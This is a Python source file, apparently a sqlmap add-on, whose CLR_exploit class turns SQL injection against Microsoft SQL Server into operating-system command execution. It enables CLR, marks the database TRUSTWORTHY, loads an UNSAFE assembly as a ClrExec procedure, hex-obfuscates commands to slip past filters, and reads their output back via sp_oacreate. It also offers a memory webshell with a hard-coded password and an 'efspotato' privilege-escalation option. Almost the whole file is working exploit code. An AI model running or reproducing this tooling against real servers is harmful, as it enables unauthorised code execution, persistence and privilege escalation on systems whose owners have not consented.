#!/usr/bin/env python

from lib.core.agent import agent
from lib.core.common import Backend
from lib.core.common import flattenValue
from lib.core.common import getLimitRange
from lib.core.common import getSQLSnippet
from lib.core.common import hashDBWrite
from lib.core.common import isListLike
from lib.core.common import isNoneValue
from lib.core.common import isNumPosStrValue
from lib.core.common import isTechniqueAvailable
from lib.core.common import popValue
from lib.core.common import pushValue
from lib.core.common import randomStr
from lib.core.common import readInput
from lib.core.common import wasLastResponseDelayed
from lib.core.compat import xrange
from lib.core.convert import encodeHex
from lib.core.data import conf
from lib.core.data import kb
from lib.core.data import logger
from lib.core.decorators import stackedmethod
from lib.core.enums import CHARSET_TYPE
from lib.core.enums import DBMS
from lib.core.enums import EXPECTED
from lib.core.enums import HASHDB_KEYS
from lib.core.enums import PAYLOAD
from lib.core.exception import SqlmapUnsupportedFeatureException
from lib.core.threads import getCurrentThreadData
from lib.request import inject

class CLR_exploit(object):
    def __init__(self):
        self.clrExec = "dbo.ClrExec"
        self.assembly_name="CLR_module"

        self.clr_payload = "C:\\windows\\tasks\\clrdatabase.dll"

    def enable_clr(self):
        debugMsg = "configuring clr_enable using sp_configure "
        debugMsg += "stored procedure"
        logger.debug(debugMsg)
        cmd = getSQLSnippet(DBMS.MSSQL, "enable_clr", ENABLE=str(1))
        inject.goStacked(agent.runAsDBMSUser(cmd))

    def disable_clr(self):
        debugMsg = "configuring clr_disable using sp_configure "
        debugMsg += "stored procedure"
        logger.debug(debugMsg)
        cmd = getSQLSnippet(DBMS.MSSQL, "enable_clr", ENABLE=str(0))
        inject.goStacked(agent.runAsDBMSUser(cmd))

    def set_permission(self,currentDb):
        cmd = "ALTER DATABASE %s SET TRUSTWORTHY ON;" %(currentDb)
        inject.goStacked(agent.runAsDBMSUser(cmd))
        return True

    def create_assembly(self):
        command = '''CREATE ASSEMBLY [CLR_module] AUTHORIZATION [dbo] FROM '{payload}' WITH PERMISSION_SET = UNSAFE;'''.format(
            payload=self.clr_payload)
        logger.info("Import the assembly")
        inject.goStacked(agent.runAsDBMSUser(command))
        logger.info("Assembly execute done.")
        return True

    def create_procedure(self):
        command = "DECLARE @zzcgss nvarchar(999);set @zzcgss='CREATE PROCEDURE [dbo].[ClrExec] @cmd NVARCHAR (MAX) AS EXTERNAL NAME [CLR_module].[StoredProcedures].[ClrExec]';EXEC sp_executesql @zzcgss;"
        inject.goStacked(agent.runAsDBMSUser(command))
        logger.info("Link the assembly to a stored procedure")
        return True

    def clrShellForgeCmd(self, cmd, insertIntoTable=None):
        # When user provides DBMS credentials (with --dbms-cred) we need to
        # redirect the command standard output to a temporary file in order
        # to retrieve it afterwards
        # NOTE: this does not need to be done when the command is 'del' to
        # delete the temporary file
        if conf.dbmsCred and insertIntoTable:
            self.tmpFile = "%s/tmpc%s.txt" % (conf.tmpPath, randomStr(lowercase=True))
            cmd = "%s > \"%s\"" % (cmd, self.tmpFile)
        if cmd == "clr_memshell":
            print("webshell address: http://x.x.x.x:80/cyphercontent.js")
            print("password: content101")
            print("please wait.............................................")
        elif "clr_efspotato" in cmd:
            cmd = " %s > C:\\windows\\temp\\clreadtest.txt" % (cmd)
        elif "clr_exec" in cmd:
            cmd = " %s > C:\\windows\\temp\\clreadtest.txt" % (cmd)
        else:
            print("executing:" + cmd)
        # Obfuscate the command to execute, also useful to bypass filters
        # on single-quotes
        self._randStr = randomStr(lowercase=True)
        self._forgedCmd = "DECLARE @%s VARCHAR(8000);" % self._randStr

        try:
            self._forgedCmd += "SET @%s=%s;" % (self._randStr, "0x%s" % encodeHex(cmd, binary=False))
        except UnicodeError:
            self._forgedCmd += "SET @%s='%s';" % (self._randStr, cmd)

        # Insert the command standard output into a support table,
        # 'sqlmapoutput', except when DBMS credentials are provided because
        # it does not work unfortunately, BULK INSERT needs to be used to
        # retrieve the output when OPENROWSET is used hence the redirection
        # to a temporary file from above
        # if insertIntoTable and not conf.dbmsCred:
        #     self._forgedCmd += "INSERT INTO %s(data) " % insertIntoTable

        self._forgedCmd += "EXEC %s @%s" % (self.clrExec, self._randStr)

        return agent.runAsDBMSUser(self._forgedCmd)

    def clrShellExecCmd(self, cmd, silent=False):
        return inject.goStacked(self.clrShellForgeCmd(cmd), silent)

    def clrShellEvalCmd(self, cmd, first=None, last=None):
        output = None

        if conf.direct:
            output = self.clrShellExecCmd(cmd)

            if output and isinstance(output, (list, tuple)):
                new_output = ""

                for line in output:
                    if line == "NULL":
                        new_output += "\n"
                    else:
                        new_output += "%s\n" % line.strip("\r")

                output = new_output
        else:
            inject.goStacked(self.clrShellForgeCmd(cmd))
            self.tblField = 'data'
            # When user provides DBMS credentials (with --dbms-cred), the
            # command standard output is redirected to a temporary file
            # The file needs to be copied to the support table,
            # 'sqlmapoutput'
            # if conf.dbmsCred:
            #     inject.goStacked("BULK INSERT %s FROM '%s' WITH (CODEPAGE='RAW', FIELDTERMINATOR='%s', ROWTERMINATOR='%s')" % (self.cmdTblName, self.tmpFile, randomStr(10), randomStr(10)))
            #     self.delRemoteFile(self.tmpFile)
            activate = getSQLSnippet(DBMS.MSSQL, "activate_sp_oacreate")
            inject.goStacked(agent.runAsDBMSUser(activate))

            hexTbl = "%s%shex" % (self.fileTblName, randomStr())
            inject.goStacked("DROP TABLE %s" % hexTbl)
            inject.goStacked(
                "declare @object int;declare @file int;declare @data varchar(8000);exec [master]..[sp_oacreate] 'scripting.filesystemobject',@object out;exec [master]..[sp_oamethod] @object,'OpenTextFile',@file output,'c:\\windows\\temp\\clreadtest.txt';create table %s(data varchar(8000));exec [master]..[sp_oamethod] @file,'read',@data out,8000;insert into %s(data) values(@data);" % (
                    hexTbl, hexTbl))

            query = "SELECT %s FROM %s" % (self.tblField, hexTbl)

            # 有回显注入直接从回显注入里面查询
            if any(isTechniqueAvailable(_) for _ in (PAYLOAD.TECHNIQUE.UNION, PAYLOAD.TECHNIQUE.ERROR, PAYLOAD.TECHNIQUE.QUERY)) or conf.direct:
                output = inject.getValue(query, resumeValue=False, blind=False, time=False)

            if (output is None) or len(output) == 0 or output[0] is None:
                output = []
                # self.cmdTblName 是 'sqlmapoutput'
                # count = inject.getValue("SELECT COUNT(id) FROM %s" % self.cmdTblName, resumeValue=False, union=False, error=False, expected=EXPECTED.INT, charsetType=CHARSET_TYPE.DIGITS)


                count = inject.getValue("SELECT COUNT(*) FROM %s" % (hexTbl), resumeValue=False, expected=EXPECTED.INT,
                                        charsetType=CHARSET_TYPE.DIGITS)

                if isNumPosStrValue(count):
                    for index in getLimitRange(count):
                        query = agent.limitQuery(index, query, self.tblField)
                        # 获取最终的输出
                        output.append(inject.getValue(query, union=False, error=False, resumeValue=False))

            inject.goStacked("DELETE FROM %s" % hexTbl)

            if output and isListLike(output) and len(output) > 1:
                _ = ""
                lines = [line for line in flattenValue(output) if line is not None]

                for i in xrange(len(lines)):
                    line = lines[i] or ""
                    if line is None or i in (0, len(lines) - 1) and not line.strip():
                        continue
                    _ += "%s\n" % line

                output = _.rstrip('\n')

        return output
